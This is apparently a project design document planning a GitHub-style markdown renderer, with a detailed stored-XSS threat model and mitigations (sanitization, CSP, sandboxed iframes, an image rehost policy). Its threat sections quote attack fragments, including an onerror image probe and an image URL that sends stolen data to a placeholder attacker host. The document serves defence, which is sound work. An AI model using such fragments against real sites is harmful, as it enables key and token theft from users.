# Markdown rendering like GitHub — plan and security concern

Status: CONCERN DOCUMENTED, decision pending. Do not implement the
renderer until the open decisions at the bottom are made.

## Why

The app replicates the GitHub repo view; the README card is core to it
(design objective 2). Today `miniMd` (main.js) renders a hand-rolled,
HTML-escaping subset: h1–h4, fenced code, inline code, bold, images,
links, flat bullet lists. Real-world READMEs (e.g. agregore-browser's)
already break it: HTML layout blocks (`<p align="center">`) show as
literal text, relative images (`./build/icon.png`) 404 against the Pages
origin, and tables/task lists/strikethrough don't exist.

## Planned approach (not yet approved)

Replace `miniMd` with `marked` (GFM: tables, task lists, strikethrough,
autolinks) + `DOMPurify` (GitHub-style sanitization), behind one wrapper
(`js/markdown.js`: render → sanitize → rewrite repo-relative links and
images into the embedded file set — the part gateways can't do). The same
renderer then serves the README card, `.md` blobs (rendered + Raw
toggle), issue bodies/comments, and the wiki panel.

## The security concern

Rendered markdown is the classic stored-XSS vehicle. "Like GitHub" means
allowing sanitized HTML blocks — the moment raw HTML renders,
sanitization is the only barrier between an attacker and script execution
in our origin. Inputs are genuinely untrusted:

- **The README itself** — whatever repo the app is deployed for,
  including a malicious fork's.
- **Issues/comments from the network** — signed, but signatures prove
  authorship, not safety. Any peer can sign a note carrying
  `<img onerror=…>`. Verification is identity, not moderation.
- **Fetched CIDs** — arbitrary network content.

### Blast radius specific to this app (same-origin script gets)

- `localStorage` → the Ed25519 **IPNS private keys**
  (`ipns-branch-key:<repo>`, `ipns-index-key:<repo>`): sign fraudulent
  notes, repoint the branch/index names at malicious roots.
- The **Kubo RPC bridge**: a configured Kubo at `127.0.0.1:5001` (our
  settings panel tells users to open CORS `*`) exposes the full Kubo API
  to injected JS — add/pin/remove content, read the node's repo. Near-
  total compromise of the host's node.
- **Pinning-service tokens** (`remote-pin-config`) — exfiltratable.
- The in-page Helia node: dial peers, announce bogus CIDs, poison
  gossip.

### Mitigation stack (part of "like GitHub", not optional)

1. **DOMPurify after marked**, GitHub-style config — strip scripts,
   event handlers, `style`; keep the safe whitelist (incl. `align`).
   Never `innerHTML` raw marked output ([marked does not
   sanitize](https://marked.js.org/) — upstream's own warning).
   Keep DOMPurify pinned-current (floor ≥ 3.2.4, CVE-2025-26791):
   sanitizer bypasses (incl. mXSS via SVG/MathML namespace confusion)
   are a living CVE stream
   ([bypass history](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)),
   and the sanitizer must be namespace-aware.
2. **URL scheme filtering** — `javascript:`, `data:` (except possibly
   images), `vbscript:` blocked in hrefs/srcs.
3. **CSP meta tag** (works on GitHub Pages): `script-src 'self'` kills
   injected scripts and inline handlers even if sanitization misses;
   never add `blob:` to script sources ([blob URLs execute as
   script](https://centralcsp.com/en/docs/web-security/policies/content-security-policy/directives/script-src-elem)).
   `img-src` is the enforcement layer for the image policy below.
   Prerequisite: remove the few inline `onclick=` attributes in
   index.html (the delegated-listener idiom already covers them).
4. **Image policy** — see "Image smuggling" below. DECISION NEEDED.
5. `rel="noopener"` + `target="_blank"` on rendered links (tabnabbing).
6. **Optional hard isolation**: render network-supplied content (issue
   notes, fetched docs) in `<iframe sandbox="">` without
   `allow-same-origin` — zero origin access. Costs: primer CSS injected
   into the frame, `allow-popups` for links. DECISION NEEDED.

### SVG smuggling (active content)

SVG is XML, not a passive picture — it can carry `<script>`, event
attributes (`onload`), `<a xlink:href="javascript:…">`,
`<foreignObject>` HTML, and `<animate>` attribute-mutation XSS
([payload survey](https://salivity.github.io/svg/article/svg-xss-how-malicious-scripts-execute-in-sv-gs),
[weaponization in the wild](https://www.cryptika.com/hackers-weaponizing-svg-files-with-malicious-embedded-javascript-to-execute-malware-on-windows-systems/)). Context
decides everything:

- `<img src="x.svg">` (and CSS backgrounds) are script-inert — the SVG
  parses in image context ([confirmed](https://security.stackexchange.com/questions/212894/is-there-a-way-to-execute-xss-in-an-html-img-tag-with-svg)). This is the ONLY safe way to render SVG.
- Inline `<svg>` in HTML, `<object>`, `<embed>`, `<iframe>`, or
  top-level navigation to an `.svg` URL = scriptable context
  ([demonstrated](https://www.arnevogel.com/til/svg-script/)).
- Sanitized output must therefore forbid `<object>`, `<embed>`,
  `<iframe>`, and either forbid inline `<svg>` entirely or run it
  through a namespace-aware SVG sanitizer profile (no `<script>`, no
  `<foreignObject>`, no `<animate>`, no `xlink:href`/`href` with
  executable schemes, no event attributes). A sanitizer that treats SVG
  as opaque markup gets mXSS'd — DOMPurify's bypass history is the
  proof ([attack classes](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History),
  [namespace-confusion bypass](https://securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html)).
- Repo and network content both include SVGs (icons, badges). Rule:
  render SVG via `<img>`/blob URL only, never inline; the blob view's
  image preview must not inline SVG either.

### Image smuggling (privacy + exfiltration)

- **Tracking pixels**: every remote `<img>` beacons viewer IP, user-
  agent, timing, and the page URL (which may carry `?uri=`, repo
  identity, peer info) to the image host ([web beacons](https://en.wikipedia.org/wiki/Web_beacon)).
  GitHub runs camo precisely because of this — "your browser information
  won't be leaked to other third party services"
  ([GitHub blog](https://github.blog/news-insights/product-news/proxying-user-images/));
  GitLab ships [go-camo](https://docs.gitlab.com/security/asset_proxy/)
  for the same reason. We have no proxy. DECISION on the policy.
- **Gateway leakage is still leakage**: even "decentralized" loading
  tells the gateway operator which CIDs you view; loading via our own
  Helia node instead leaks to the swarm/providers. There is no
  observer-free remote image — only a choice of observer. Embedded
  (in-bundle) images leak nothing.
- **Data-URI images**: `data:image/svg+xml` is active content if it
  ever reaches a scriptable context; oversized data URIs are a memory
  knob. Restrict `data:` to raster MIME types if allowed at all.
- **Mixed content**: `http://` images on the `https://` Pages origin
  are blocked or downgrade — renderers should not emit them.
- **Exfil channel**: post-XSS, image URLs are the classic data-
  exfiltration path (`<img src="https://attacker/<stolen-data>>`) —
  CSP `img-src` limits where they can go.

### Steganography and polyglot files (payload in inert-looking media)

Sanitization works on markup, not on file bytes. A payload hidden in a
valid PNG (LSB steganography) or a **polyglot** file that is
simultaneously a valid image and valid HTML/JS passes every layer above
untouched — the image is a real image. This is not hypothetical: DPRK's
Contagious Interview campaign hid C2 payloads in SVGs
([Securonix](https://connect.securonix.com/threat-research-intelligence-62/flags-fake-jobs-and-fileless-payloads-inside-dprk-s-svg-steganography-contagious-interview-campaign-440));
SVG steganography is an active research area
([CVPR GVIS](https://openaccess.thecvf.com/content/CVPR2026/papers/Xu_GVIS_Generative_Vector_Image_Steganography_CVPR_2026_paper.pdf))
with commercial tooling. We will NOT attempt stego
detection (statistically infeasible in-browser); the defense is
containment: repo/network bytes are never executed and never served as
documents.

- **Polyglot delivery paths to keep shut**: `blob:` URLs inherit the
  page's origin ([MDN](https://developer.mozilla.org/en-US/docs/Web/API/Worker/Worker))
  — a `blob:` URL typed `text/html` and navigated to
  top-level executes in the app's origin with full key access. Same for
  `data:` navigation and any raw-view iframe that renders bytes as a
  document. Rule: file content is rendered as escaped text or `<img>`
  (script-inert), or downloaded as an attachment — never navigated,
  never injected as HTML, never iframed as a document. GitHub isolates
  user content on a separate domain (raw.githubusercontent.com) for
  exactly this reason; we get the same guarantee by construction.
- **Exfiltration dead-drop**: post-XSS, stolen localStorage (IPNS keys,
  pin tokens) can be stego-encoded into an image and published through
  the app's own Publish tab — IPFS as the dead-drop, retrieval later by
  CID. CSP `connect-src`/`img-src` limits the destination set; the
  durable fix is key custody (non-extractable `CryptoKey` where the
  platform allows — our keys are raw bytes in localStorage today,
  extractable by design because IPNS publishing needs the raw key).
- **What this changes**: strengthens the case for the sandboxed-iframe
  option and a strict CSP — rendered content should never share an
  execution context with the keys.
- **Working PoCs exist — in-repo fixtures**: `tests/fixtures/stego/`
  (generator `scripts/build-stego-fixtures.mjs`, round-trip decoder
  tests `tests/stego-fixtures.test.mjs`) carries the three techniques on
  the real gnostr.svg carrier (`gnostr-clean.svg` == the pinned interop
  vector): `gnostr-matrix-stego.svg` (`feColorMatrix` coefficients),
  `gnostr-phantom-stego.svg` (polyline coordinate decimals),
  `gnostr-lsb.ppm` (blue-channel LSB of the rsvg-rasterized logo). Each
  decodes to its manifest payload and none contains it as plaintext —
  the exact property renderers must be tested against. Origin gists:
  https://gist.github.com/RandyMcMillan/55e56ac549b4c31ac16ce7f7c7d381bd ·
  https://gist.github.com/RandyMcMillan/7b7b0de098cd26a341fc4a7390d22254 ·
  https://gist.github.com/RandyMcMillan/524a2d81ee8f0df35fcf2b08f0e1222c

## External verification (2026-11-11)

Every load-bearing claim above was checked against external sources, not
just asserted:

| Claim | Verdict | Sources |
|---|---|---|
| SVG via `<img>` is script-inert; inline/`<embed>`/navigation execute | CONFIRMED — scripts run when SVG is inline or embedded, never in `<img>` context | [InfoSec SE #212894](https://security.stackexchange.com/questions/212894/is-there-a-way-to-execute-xss-in-an-html-img-tag-with-svg), [arnevogel.com/til/svg-script](https://www.arnevogel.com/til/svg-script/) |
| mXSS is a living CVE stream, sanitizer must stay current | CONFIRMED — CVE-2020-26870 (namespace confusion), CVE-2025-26791 (DOMPurify < 3.2.4) | [Cure53 Attack Classes wiki](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History), [securitum mXSS writeup](https://securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html) |
| marked does not sanitize; sanitize after render | CONFIRMED — upstream warns and recommends DOMPurify | [marked.js.org](https://marked.js.org/), [markedjs/marked#3943](https://github.com/markedjs/marked/issues/3943) |
| `blob:`/`data:` navigation inherits the app origin | CONFIRMED — blob URLs are same-origin with the creator; `blob:` in `script-src` is flagged risky | [MDN Worker()](https://developer.mozilla.org/en-US/docs/Web/API/Worker/Worker), [centralcsp script-src-elem](https://centralcsp.com/en/docs/web-security/policies/content-security-policy/directives/script-src-elem) |
| Remote images are tracking beacons | CONFIRMED — IP/location/timestamp leak to the image host | [Wikipedia: Web beacon](https://en.wikipedia.org/wiki/Web_beacon) |
| Camo's purpose (privacy proxy) | CONFIRMED — "your browser information won't be leaked"; GitLab ships go-camo for the same reason | [GitHub blog: Proxying User Images](https://github.blog/news-insights/product-news/proxying-user-images/), [GitLab asset proxy docs](https://docs.gitlab.com/security/asset_proxy/) |
| SVG steganography is real-world, not just PoCs | CONFIRMED STRONGER — DPRK's Contagious Interview campaign hid C2 payloads in SVGs; academic + commercial SVG-stego tooling exists | [Securonix threat research](https://connect.securonix.com/threat-research-intelligence-62/flags-fake-jobs-and-fileless-payloads-inside-dprk-s-svg-steganography-contagious-interview-campaign-440), [CVPR GVIS](https://openaccess.thecvf.com/content/CVPR2026/papers/Xu_GVIS_Generative_Vector_Image_Steganography_CVPR_2026_paper.pdf) |

Corrections adopted from verification:

- **DOMPurify floor is ≥ 3.2.4** (CVE-2025-26791) — pin and track
  updates; the "namespace-aware" requirement is necessary but not
  sufficient on its own.
- The steganography section's "working PoCs exist" now has a
  **real-world campaign** behind it (DPRK SVG-stego C2), not just the
  owner's gists and academic literature.
- If the image-policy decision ever goes the proxy route,
  [go-camo](https://github.com/cactus/go-camo) is the maintained camo
  successor (GitLab uses it) — see `docs/ipfs-rehost-service.md`.

## Decisions — TAKEN (2026-11-11)

1. **Image policy: rehost-first.** Remote images go through the rehost
   service (fetch-once → content-addressed URL, recorded on the chain);
   a failed rehost BLOCKS the image (alt text) rather than beaconing the
   origin. `js/rehost.js` + `scripts/rehost-service.mjs`.
2. **SVG policy: `<img>`-only.** DOMPurify config forbids inline
   `<svg>`/`<math>` outright — no SVG-sanitizer profile to keep perfect.
3. **Network content (issue bodies/comments, fetched docs): sandboxed
   iframe** (`sandbox="allow-popups"`, no `allow-same-origin`); repo
   content (README, .md blobs): sanitize + CSP in the page.
4. **CSP meta: shipped.** `script-src 'self'` (theme script moved to
   `public/theme-init.js`, the one inline handler de-inlined);
   `img-src 'self' data: https:`; `connect-src` includes ws:/wss: and the
   loopback services. Verified blocking inline handlers in CDP.
5. **Deps approved:** marked + dompurify (≥3.2.4 floor).

## Verification (when approved) — DONE

- Unit: `tests/markdown.test.mjs` (marked GFM, classifyUrl, resolveRepoPath).
- CDP: `tests/cdp-markdown.mjs` (boot under CSP, CSP blocks inline
  handlers, README renders sanitized GFM, issue body sandboxed, payload
  inert); `tests/cdp-issues.mjs` (comment chain via srcdoc).

## Verification plan (when approved)

- Unit: `js/markdown.js` — GFM constructs (tables, task lists,
  strikethrough), sanitization (script/onerror/style stripped, align
  kept), scheme filtering, repo-relative image/link rewriting.
- CDP: README card renders an agregore-style README (HTML block +
  relative image + table); an `<img onerror>` probe in an issue body
  does not execute.
